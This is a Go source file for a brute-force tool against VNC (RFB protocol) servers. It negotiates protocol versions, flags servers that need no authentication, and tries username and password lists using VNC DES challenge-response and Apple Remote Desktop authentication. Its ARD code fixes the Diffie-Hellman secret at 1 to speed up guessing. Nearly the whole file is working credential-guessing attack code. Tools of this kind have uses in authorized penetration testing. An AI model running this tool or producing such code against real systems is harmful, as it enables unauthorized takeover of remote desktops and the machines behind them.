/*
This file implements brute-force attack against the Remote Framebuffer (RFB) protocol,
	which is used in Virtual Network Computing (VNC) and its derivatives.

Usage:
	vc := NewVNC(...)
	vc.Run()

Note:
	1. Currently, only None[1], vncAuth[2], and ARD[30] are unsupported. To be implemented:
			Tight[16], TLS[18], VeNCrypt[19]
			RA2[5], RA2ne[6], mac[35] (once their algorithms are out)
	2. Whenever we send the tls client hello (either TLS or VeNCrypt),
		server closes the connection immediately.
		Maybe TLS 1.2 & 1.3 is incompatible with previous versions?
	3. modify the authentication mode (see afp)

Reference:
	https://tools.ietf.org/html/rfc6143
	https://github.com/rfbproto/rfbproto
	https://static.realvnc.com/media/documents/realvnc-rfb-protocol-security-analysis.pdf
	https://cafbit.com/post/apple_remote_desktop_quirks/
*/

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/des"
	"crypto/md5"
	"math/big"
	"net"
	"strings"
	"time"
)

type vncConn struct {
	/* Connection */
	network string
	ip      string
	port    string
	timeout time.Duration
	conn    net.Conn

	/* Packet */
	message []byte /* store message read */
	length  int    /* message length */

	/* Account */
	*list /* credential list for brute-force attack */
}

/* create and initialize a new *vncConn object */
func NewVNC(network, ip, port string, timeout time.Duration, userlist, passlist []string) *vncConn {
	var vc = &vncConn{ip: ip, timeout: timeout, list: NewList(userlist, passlist)}

	/* default network tcp */
	if network == "" {
		vc.network = "tcp"
	} else {
		vc.network = network
	}

	/* default port 5900 */
	if port == "" {
		vc.port = "5900"
	} else {
		vc.port = port
	}

	return vc
}

/* the one-for-all telnet brute-force method,
   call directly after a vncConn is initialized */
func (vc *vncConn) Run() {
	var err error
	var goon = true

	for goon == true {
		/* initialize transport layer connection */
		vc.conn, err = net.DialTimeout(vc.network, vc.ip+":"+vc.port, vc.timeout)
		if err != nil {
			vc.WriteError("failed to connect to the server: %s", err)
			return
		}

		/* continue or not */
		goon = vc.login()

		vc.conn.Close()
	}
}

/************************************************************************
 *                              Try Login                               *
 ************************************************************************/

/* read ProtocolVersion packet and decide which login method to use */
func (vc *vncConn) login() bool {
	/* read ProtocolVersion packet */
	err := vc.read()
	if err != nil {
		if err.Error() == "EOF" {
			vc.WriteError("connection refused")
		} else {
			vc.WriteError("failed to read protocol version: %s", err)
		}
		return false
	}

	/* some servers will send a "too many security failures" or
	   "to many authentication failures" message if we failed too many times */
	str := string(vc.message[:vc.length])
	if strings.Contains(str, "failure") {
		vc.WriteError("connection refused: %s", str)
		return false
	}

	/* handshake format: RFB 003.007\n
	   server may send handshake packet appended with additional information (RealVNC 3.3) */
	if vc.length < 12 || !strings.HasPrefix(str, "RFB ") || str[7] != '.' || str[11] != '\n' {
		vc.WriteError("invalid packet: %s", str)
		return false
	}

	/* parse major and minor versions */
	major := (int(vc.message[4])-48)*100 + (int(vc.message[5])-48)*10 + (int(vc.message[6]) - 48)
	minor := (int(vc.message[8])-48)*100 + (int(vc.message[9])-48)*10 + (int(vc.message[10]) - 48)

	/* The only published protocol versions at this time are 3.3, 3.7, and 3.8. */
	if major < 3 || major > 5 || minor < 0 {
		vc.WriteError("invalid VNC version: %d.%d", major, minor)
		return false
	}

	/* send ProtocolVersion packet */
	if major == 3 && minor == 7 {
		/* version 3.7 */
		err = vc.write([]byte("RFB 003.007\n"))
		if err != nil {
			vc.WriteError("failed to send protocol version: %s", err)
			return false
		}
		return vc.login38()

	} else if major == 3 && minor != 8 && minor != 889 {
		/* general version 3.x */
		err = vc.write([]byte("RFB 003.003\n"))
		if err != nil {
			vc.WriteError("failed to send protocol version: %s", err)
			return false
		}
		return vc.login33()

	} else {
		/* version 3.8, 3.889, 4.x, 5.x */
		err = vc.write([]byte("RFB 003.008\n"))
		// err = vc.write(vc.message[:12]) /* send back the same version */
		if err != nil {
			vc.WriteError("failed to send protocol version: %s", err)
			return false
		}
		return vc.login38()
	}
}

/* any unknown 3.x version must be treated as 3.3 */
func (vc *vncConn) login33() bool {
	/* read Security packet */
	err := vc.read()
	if err != nil {
		/* server may close connection immediately after sending ProtocolVersion (RealVNC 3.3) */
		if err.Error() == "EOF" {
			vc.WriteError("session terminated by server")
		} else {
			vc.WriteError("failed to read the security option: %s", err)
		}
		return false
	}

	/* 4-byte security type in big endian */
	if vc.length < 4 {
		vc.WriteError("invalid security option packet: %v", vc.message[:vc.length])
		return false
	}

	/* The security-type may only take the value 0, 1, or 2. */
	switch vc.message[3] {
	case 0: /* invalid */
		if vc.length < 9 {
			vc.WriteError("connection refused")
		} else {
			vc.WriteError("connection refused: %s", vc.message[8:vc.length])
		}

	case 1: /* none */
		vc.WriteResult(NOAUTH)

	case 2: /* vnc authentication */
		return vc.vncAuth(vc.message[4:vc.length])

	default:
		vc.WriteError("invalid security option type: %d", vc.message[3])
	}
	return false
}

/* version 3.7, 3.8, 3.889 (Apple), 4.0+ (RealVNC) */
func (vc *vncConn) login38() bool {
	/* read Security packet */
	err := vc.read()
	if err != nil {
		/* server may close connection immediately after sending ProtocolVersion */
		if err.Error() == "EOF" {
			vc.WriteError("session terminated by server")
		} else {
			vc.WriteError("failed to read the security option: %s", err)
		}
		return false
	}

	/* If number-of-security-types is zero, then for some reason the connection failed. */
	if vc.message[0] == 0 {
		if vc.length < 6 {
			vc.WriteError("connection refused")
		} else {
			vc.WriteError("connection refused: %s", vc.message[5:vc.length])
		}
		return false
	}

	/* server may send security options in multiple packets (TightVNC) */
	length := int(vc.message[0]) + 1
	options := vc.message[1:vc.length]
	for len(options) < length-1 {
		err = vc.read()
		if err != nil {
			vc.WriteError("invalid security option packet: %v", options)
			return false
		}
		options = append(options, vc.message[:vc.length]...)
	}

	/* format: number-of-security-types + []authmethod */
	if len(options) > length-1 {
		vc.WriteError("invalid security option packet: %v", options)
		return false
	}

	/* send back a single byte indicating which security type is to be used */
	if bytes.IndexByte(options, 1) != -1 { /* none */
		return vc.handleResult(NOAUTH)

	} else if bytes.IndexByte(options, 2) != -1 { /* VNC authentication */
		err = vc.write([]byte{2})
		if err != nil {
			vc.WriteError("failed to send security option vncAuth")
			return false
		}
		return vc.vncAuth(nil)

	} else if bytes.IndexByte(options, 30) != -1 { /* Apple Remote Desktop */
		err = vc.write([]byte{30})
		if err != nil {
			vc.WriteError("failed to send security option ARD")
			return false
		}
		return vc.ardAuth()

	} else { /* unsupported */
		vc.WriteError("unsupported security options: %v", options)
		return false
	}
}

/* handle SecurityResult packet */
func (vc *vncConn) handleResult(auth AuthMode) bool {
	/* read SecurityResult */
	err := vc.read()
	if err != nil {
		/* some servers will close the connection if password is incorrect */
		if err.Error() == "EOF" {
			return vc.HasNext(auth)
		}
		vc.WriteError("failed to read login result: %s", err)
		return false
	}

	/* 4-byte auth result in big endian */
	if vc.length < 4 {
		vc.WriteError("invalid login result packet: %v", vc.message[:vc.length])
		return false
	}

	if vc.message[3] == 0 {
		vc.WriteResult(auth)
	}

	return vc.HasNext(auth)
}

/************************************************************************
 *                            Authentication                            *
 ************************************************************************/

/* do vncAuth authentication */
func (vc *vncConn) vncAuth(salt []byte) bool {
	/* if we have not received the salt, read it from server */
	if len(salt) == 0 {
		err := vc.read()
		if err != nil {
			vc.WriteError("no salt for vncAuth: %s", err)
			return false
		}
		salt = vc.message[:vc.length]
	}

	/* DES salt length 16 */
	if len(salt) != 16 {
		vc.WriteError("invalid salt length for vncAuth")
		return false
	}

	tmp := make([]byte, 8)
	res := make([]byte, 16)

	/* generate des key */
	_, password := vc.Next(PASS)
	copy(tmp, password)
	for i := 0; i < 8; i++ {
		if tmp[i] == 0 {
			break
		}
		tmp[i] = vc.mirrorByte(tmp[i])
	}

	/* des encryption */
	c, _ := des.NewCipher(tmp)
	c.Encrypt(res[:8], salt[:8])
	c.Encrypt(res[8:], salt[8:])

	/* send vncAuth response */
	err := vc.write(res)
	if err != nil {
		vc.WriteError("failed to send vncAuth password: %s", err)
		return false
	}

	return vc.handleResult(PASS)
}

/* reverse order of bits in a byte */
func (vc *vncConn) mirrorByte(in byte) byte {
	var out byte
	for i := 0; i < 8; i++ {
		out <<= 1
		out += in & 1
		in >>= 1
	}
	return out
}

/* do Apple Remote Desktop authentication */
func (vc *vncConn) ardAuth() bool {
	/* Read Diffie-Hellman exchange packet */
	err := vc.read()
	if err != nil {
		vc.WriteError("no ARD Diffie-Hellman pubkey from server: %s", err)
		return false
	}

	/* make sure the packet is in correct format */
	if vc.length < 4 {
		vc.WriteError("incorrect ARD Diffie-Hellman exchange packet from server")
		return false
	}

	/* make sure the packet is in correct format */
	length := int(vc.message[2])*256 + int(vc.message[3])
	if vc.length != length*2+4 {
		vc.WriteError("incorrect ARD Diffie-Hellman exchange packet from server")
		return false
	}

	/* Normally, we should do this:
			secret := big.NewInt(rand.Int())
			clientkey := new(big.Int).Exp(generator, secret, modulus)
			privkey := new(big.Int).Exp(serverkey, secret, modulus)
	   Since we are brute-forcing, set secret to 1 */

	/* unpack serverkey from packet */
	serverkey := new(big.Int).SetBytes(vc.message[4+length : vc.length])

	/* generate AES key: md5(0-paddings + shared private key)
	   recall that privkey==serverkey when secret==1 */
	buf := make([]byte, length)
	buf = serverkey.FillBytes(buf)
	aeskey := md5.Sum(buf)

	/* Retrieve the username and password, and pack them in one slice
	   each 64 bytes, null terminated */
	username, password := vc.Next(CRED)
	cred := make([]byte, 128)
	copy(cred[:63], username)
	copy(cred[64:127], password)

	/* aes-128-ecb encryption */
	c, _ := aes.NewCipher(aeskey[:])
	for i := 0; i < 128; i += c.BlockSize() {
		c.Encrypt(cred[i:], cred[i:])
	}

	/* write reponse packet: encrypted credentials + clientkey
	   recall that generator==clientkey when secret==1 */
	buf = make([]byte, length)
	copy(buf[length-2:], vc.message[:2])
	err = vc.write(append(cred, buf...))
	if err != nil {
		vc.WriteError("failed to send ARD auth response: %s", err)
		return false
	}

	return vc.handleResult(CRED)
}

/************************************************************************
 *                            Handle Packets                            *
 ************************************************************************/

/* read message from the server */
func (vc *vncConn) read() error {
	err := vc.conn.SetReadDeadline(time.Now().Add(vc.timeout))
	if err != nil {
		return err
	}

	buf := make([]byte, 512)
	n, err := vc.conn.Read(buf)
	if err != nil {
		return err
	}

	vc.message = buf
	vc.length = n
	return nil
}

/* send response to the server */
func (vc *vncConn) write(message []byte) error {
	err := vc.conn.SetWriteDeadline(time.Now().Add(vc.timeout))
	if err != nil {
		return err
	}

	_, err = vc.conn.Write(message)
	return err
}
